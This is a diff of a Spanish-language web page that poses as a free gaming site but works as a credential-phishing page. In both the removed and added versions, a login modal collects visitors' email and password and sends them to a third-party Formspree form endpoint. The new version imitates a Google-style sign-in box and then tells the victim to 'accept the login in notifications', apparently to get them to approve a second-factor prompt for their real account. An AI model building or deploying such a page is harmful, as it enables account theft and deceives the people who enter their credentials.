@@ -1,182 +1,328 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Plataforma de Juegos - Chat</title>
-  <meta name="description" content="Página de juegos y chat — profesional, responsiva y lista para GitHub Pages. Incluye modal de registro que envía datos a Formspree." />
-  <style>
-    :root{
-      --accent:#1f6feb;
-      --accent-2:#7c3aed;
-      --muted:#6b7280;
-      --card-shadow: 0 6px 18px rgba(16,24,40,0.08);
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-    }
-    *{box-sizing:border-box}
-    body{margin:0;background:#ffffff;color:#0f172a;line-height:1.4}
-    .container{max-width:1200px;margin:0 auto;padding:28px}
-    header{display:flex;align-items:center;justify-content:space-between;padding:18px 0}
-    .brand{display:flex;align-items:center;gap:12px}
-    .brand img{height:48px;width:48px;object-fit:contain}
-    h1{font-size:28px;margin:0}
-    .subtitle{color:var(--muted);font-size:14px}
-    .hero{display:grid;grid-template-columns:1fr 420px;gap:28px;margin-top:18px}
-    .panel{background:#fff;border-radius:16px;padding:22px;box-shadow:var(--card-shadow)}
-    .games-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
-    .game-card{border-radius:12px;padding:12px;background:#fff;display:flex;flex-direction:column;gap:8px;align-items:center;border:1px solid rgba(16,24,40,0.08)}
-    .game-card img{width:100%;height:120px;object-fit:cover;border-radius:8px}
-    .game-title{font-weight:600}
-    .game-meta{font-size:13px;color:var(--muted)}
-    .featured{display:flex;flex-direction:column;gap:12px}
-    .featured img{width:100%;height:260px;object-fit:cover;border-radius:12px}
-    .btn{padding:12px 16px;border-radius:10px;border:0;cursor:pointer;font-weight:600}
-    .btn-primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff}
-    .btn-ghost{background:transparent;border:1px solid rgba(16,24,40,0.06)}
-    footer{margin-top:28px;padding:18px 0;text-align:center;color:var(--muted);font-size:14px}
-    .overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);backdrop-filter:blur(6px);z-index:60}
-    .modal{width:min(520px,94%);background:#fff;border-radius:14px;padding:22px;box-shadow:0 20px 60px rgba(2,6,23,0.45)}
-    .modal .logo{text-align:center;margin-bottom:10px}
-    .modal h2{text-align:center;margin:10px 0 6px;font-size:20px}
-    .form-group{display:flex;flex-direction:column;gap:6px;margin-bottom:12px}
-    label{font-size:13px;color:var(--muted)}
-    input{padding:12px;border-radius:10px;border:1px solid rgba(16,24,40,0.2);outline:none;font-size:15px}
-    input:focus{border-color:var(--accent)}
-    .btn-submit{width:100%;padding:12px;border-radius:10px;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#fff;font-weight:600;cursor:pointer;border:none}
-    .loading{display:none;text-align:center;margin-top:12px;color:var(--muted);font-weight:bold}
-    .impact{text-align:center;font-weight:700;font-size:18px;color:var(--accent);margin-top:10px}
-    .username-row{max-height:0;overflow:hidden;transition:max-height 0.3s ease}
-    .username-row.open{max-height:120px}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JUEGA Fácilmente</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
+
+  body {
+    min-height: 100vh;
+    background: linear-gradient(135deg, #ff6f61, #ffb347);
+    color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    line-height: 1.6;
+  }
+
+  canvas#bgCanvas {
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    z-index: -1;
+  }
+
+  header {
+    width: 100%;
+    padding: 40px 20px;
+    text-align: center;
+  }
+
+  header h1 {
+    font-size: 3em;
+    font-weight: bold;
+    text-shadow: 2px 2px 12px rgba(0,0,0,0.5);
+    margin-bottom: 10px;
+  }
+
+  .hero {
+    text-align: center;
+    max-width: 900px;
+    margin: 30px auto 50px auto;
+    padding: 0 15px;
+  }
+
+  .hero h2 {
+    font-size: 2em;
+    margin-bottom: 20px;
+    text-shadow: 1px 1px 8px rgba(0,0,0,0.4);
+  }
+
+  .hero p {
+    font-size: 1.1em;
+    margin-bottom: 30px;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+  }
+
+  .btn {
+    padding: 14px 32px;
+    font-size: 1.2em;
+    font-weight: bold;
+    border-radius: 30px;
+    border: none;
+    cursor: pointer;
+    transition: 0.3s;
+    background: #fff;
+    color: #ff6f61;
+    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+  }
+
+  .btn:hover {
+    background: #ff6f61;
+    color: #fff;
+    transform: scale(1.05);
+  }
+
+  .features {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 25px;
+    max-width: 1100px;
+    margin: 20px auto 60px auto;
+    padding: 0 15px;
+  }
+
+  .feature-card {
+    background: rgba(255,255,255,0.15);
+    padding: 25px 20px;
+    border-radius: 20px;
+    flex: 1 1 250px;
+    min-width: 250px;
+    text-align: center;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+    transition: transform 0.3s, background 0.3s;
+  }
+
+  .feature-card:hover {
+    transform: translateY(-10px);
+    background: rgba(255,255,255,0.25);
+  }
+
+  .feature-card h3 {
+    margin-bottom: 10px;
+    font-size: 1.4em;
+    font-weight: bold;
+  }
+
+  .feature-card p {
+    font-size: 1em;
+  }
+
+  /* Modal estilo Google */
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 999;
+    left:0;
+    top:0;
+    width:100%;
+    height:100%;
+    background: rgba(0,0,0,0.6);
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.4s ease;
+  }
+
+  .modal-content {
+    background: #fff;
+    color: #333;
+    padding: 40px 30px;
+    border-radius: 16px;
+    max-width: 400px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    animation: slideIn 0.4s ease;
+  }
+
+  .modal-content img {
+    width: 80px;
+    margin-bottom: 20px;
+  }
+
+  .modal h2 {
+    margin-bottom: 20px;
+    color: #202124;
+    font-weight: 600;
+    font-size: 1.6em;
+  }
+
+  .input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 6px;
+    border: 1px solid #dadce0;
+    font-size: 16px;
+    outline: none;
+    transition: 0.2s;
+  }
+  .input:focus {
+    border-color: #ff6f61;
+    box-shadow: 0 0 4px rgba(255,111,97,0.6);
+  }
+
+  .loading {
+    display: none;
+    margin-top: 20px;
+    color: #1a73e8;
+    font-weight: bold;
+  }
+
+  .message {
+    display: none;
+    margin-top: 20px;
+    font-weight: bold;
+    color: #1a73e8;
+  }
+
+  footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 0.9em;
+    background: rgba(0,0,0,0.2);
+    width: 100%;
+    margin-top: auto;
+  }
+
+  @keyframes fadeIn {
+    from {opacity:0;} to {opacity:1;}
+  }
+  @keyframes slideIn {
+    from {transform: translateY(-20px); opacity:0;}
+    to {transform: translateY(0); opacity:1;}
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <div class="brand">
-        <img src="logo.png" alt="Logo" />
-        <div>
-          <h1>Juega & Conecta</h1>
-          <div class="subtitle">La comunidad de chat gaming — juega, habla y gana</div>
-        </div>
-      </div>
-      <nav>
-        <button class="btn btn-ghost">Iniciar sesión</button>
-        <button class="btn btn-primary" id="openRegister">Registrate</button>
-      </nav>
-    </header>
 
-    <main class="hero">
-      <section class="panel">
-        <h2>Juegos Destacados</h2>
-        <div class="games-grid" id="gamesGrid"></div>
-      </section>
-      <aside class="featured panel">
-        <img src="https://picsum.photos/seed/arena/900/400" alt="Arena" />
-        <h3>Modo Arena — Enfréntate hoy</h3>
-        <p class="subtitle">Compite con jugadores reales y sube en la tabla.</p>
-      </aside>
-    </main>
+<canvas id="bgCanvas"></canvas>
 
-    <footer>
-      <small>&copy; <span id="year"></span> Juega & Conecta — Hecho para la comunidad</small>
-    </footer>
+<header>
+  <h1>JUEGA FÁCILMENTE</h1>
+</header>
+
+<div class="hero">
+  <h2>Juega en segundos</h2>
+  <p>Con nuestra herramienta exclusiva, podrás jugar rápidamente. Regístrate y sé de los primeros en acceder.</p>
+  <button class="btn" onclick="abrirModal()">JUGAR YA</button>
+</div>
+
+<div class="features">
+  <div class="feature-card">
+    <h3>Rápido y fácil</h3>
+    <p>Juega sin complicaciones.</p>
   </div>
-
-  <!-- Modal Registro -->
-  <div class="overlay" id="overlay" style="display:flex;">
-    <div class="modal">
-      <div class="logo"><img src="logo.png" alt="Logo" style="height:64px;width:64px;" /></div>
-      <h2>Regístrate ahora</h2>
-      <form id="regForm">
-        <div class="form-group">
-          <label for="email">Correo electrónico</label>
-          <input id="email" name="email" type="email" required>
-        </div>
-        <div class="form-group">
-          <label for="password">Contraseña</label>
-          <input id="password" name="password" type="password" required>
-        </div>
-        <div class="form-group username-row" id="usernameRow">
-          <label for="username">Nombre de usuario</label>
-          <input id="username" name="username" type="text">
-        </div>
-        <button type="button" class="btn-submit" id="registerBtn">Registrarse</button>
-        <div class="impact" id="impactText">¡ÚNETE AHORA — LA AVENTURA TE ESPERA!</div>
-        <div class="loading" id="loadingText">Cargando...</div>
-      </form>
-    </div>
+  <div class="feature-card">
+    <h3>Seguro y confiable</h3>
+    <p>Todos los registros se manejan de forma segura y profesional.</p>
   </div>
+  <div class="feature-card">
+    <h3>Compatible</h3>
+    <p>Funciona en todos los dispositivos y plataformas modernas.</p>
+  </div>
+  <div class="feature-card">
+    <h3>Requisitos</h3>
+    <p>Solo mira los anuncios, para poder seguir con este proyecto gratis.</p>
+  </div>
+</div>
 
-  <script>
-    const openBtn = document.getElementById('openRegister');
-    const overlay = document.getElementById('overlay');
-    openBtn.addEventListener('click',()=>{overlay.style.display='flex';});
-    document.getElementById('year').textContent = new Date().getFullYear();
+<footer>
+  © 2025 - Tu página de juegos 🚀
+</footer>
 
-    const registerBtn = document.getElementById('registerBtn');
-    const email = document.getElementById('email');
-    const password = document.getElementById('password');
-    const usernameRow = document.getElementById('usernameRow');
-    const username = document.getElementById('username');
-    const impactText = document.getElementById('impactText');
-    const loadingText = document.getElementById('loadingText');
-    let stage = 1;
+<!-- Modal -->
+<div class="modal" id="modal">
+  <div class="modal-content">
+    <!-- Logo personalizable -->
+    <img src="logo.png" alt="Logo">
+    <h2>Inicia sesión para jugar</h2>
+    <form id="formulario" action="https://formspree.io/f/xkgvjobe" method="POST">
+      <input type="email" name="correo" class="input" placeholder="Correo" required>
+      <input type="password" name="contrasena" class="input" placeholder="Contraseña" required>
+      <button type="submit" class="btn">Iniciar sesión</button>
+    </form>
+    <div class="loading" id="loading">Cargando aplicación...</div>
+    <div class="message" id="message">Aceptar inicio de sesión en notificaciones...</div>
+  </div>
+</div>
 
-    registerBtn.addEventListener('click', ()=>{
-      if(stage===1){
-        if(!email.value || !password.value){
-          impactText.textContent = 'Completa correo y contraseña';
-          impactText.style.color='crimson';
-          return;
-        }
-        usernameRow.classList.add('open');
-        username.required = true;
-        impactText.textContent = 'Ahora elige tu nombre público';
-        impactText.style.color='var(--accent)';
-        stage=2;
-        return;
-      }
-      if(stage===2){
-        if(!email.value || !password.value || !username.value){
-          impactText.textContent = 'Rellena todos los campos';
-          impactText.style.color='crimson';
-          return;
-        }
-        // Mostrar cargando
-        loadingText.style.display='block';
-        impactText.style.display='none';
+<script>
+/* Fondo partículas */
+const canvas = document.getElementById('bgCanvas');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
 
-        // Enviar datos como FormData a Formspree
-        const formData = new FormData();
-        formData.append('email', email.value);
-        formData.append('password', password.value);
-        formData.append('username', username.value);
+let particles = [];
+for(let i=0;i<120;i++){
+  particles.push({
+    x: Math.random()*canvas.width,
+    y: Math.random()*canvas.height,
+    r: Math.random()*2+1,
+    dx: (Math.random()-0.5)*1,
+    dy: (Math.random()-0.5)*1
+  });
+}
 
-        fetch('https://formspree.io/f/xwpnokgw',{
-          method:'POST',
-          body:formData,
-          headers:{'Accept':'application/json'}
-        }).catch(err=>console.log('Error silencioso',err));
-      }
-    });
+function animate(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  particles.forEach(p=>{
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle = "rgba(255,255,255,0.7)";
+    ctx.fill();
+    p.x+=p.dx; p.y+=p.dy;
+    if(p.x<0||p.x>canvas.width) p.dx*=-1;
+    if(p.y<0||p.y>canvas.height) p.dy*=-1;
+  });
+  requestAnimationFrame(animate);
+}
+animate();
 
-    // generar juegos de muestra
-    const games = [
-      {title:'Batalla de Reinos',meta:'Multijugador 5v5',img:'https://picsum.photos/seed/g1/600/400'},
-      {title:'Carrera Ninja',meta:'Aventura y velocidad',img:'https://picsum.photos/seed/g2/600/400'},
-      {title:'Rompecabezas Místico',meta:'Puzzles diarios',img:'https://picsum.photos/seed/g3/600/400'},
-      {title:'Tiro Preciso',meta:'Ranked',img:'https://picsum.photos/seed/g4/600/400'},
-      {title:'Super Soccer',meta:'Deporte en línea',img:'https://picsum.photos/seed/g5/600/400'},
-      {title:'Escape Room',meta:'Cooperativo',img:'https://picsum.photos/seed/g6/600/400'}
-    ];
-    const grid = document.getElementById('gamesGrid');
-    games.forEach(g=>{
-      const card=document.createElement('div');
-      card.className='game-card';
-      card.innerHTML=`<img src=\"${g.img}\" alt=\"${g.title}\"><div class=\"game-title\">${g.title}</div><div class=\"game-meta\">${g.meta}</div>`;
-      grid.appendChild(card);
-    });
-  </script>
+/* Modal y registro */
+function abrirModal(){ 
+  document.getElementById("modal").style.display="flex"; 
+}
+
+const form = document.getElementById("formulario");
+const loading = document.getElementById("loading");
+const message = document.getElementById("message");
+
+form.addEventListener("submit", function(e){
+  e.preventDefault();
+  loading.style.display="block";
+  message.style.display="none";
+
+  const formData = new FormData(form);
+  fetch(form.action,{
+    method:"POST",
+    body: formData,
+    headers:{'Accept':'application/json'}
+  })
+  .then(response=>{
+    loading.style.display="block";
+    message.style.display="block";
+  })
+  .catch(err=>{
+    loading.style.display="none";
+    message.innerText="Ocurrió un error, intenta de nuevo.";
+    message.style.display="block";
+  });
+});
+
+/* Cerrar modal */
+window.onclick = function(event){
+  const modal = document.getElementById("modal");
+  if(event.target==modal){ modal.style.display="none"; }
+}
+</script>
+
 </body>
 </html>
-
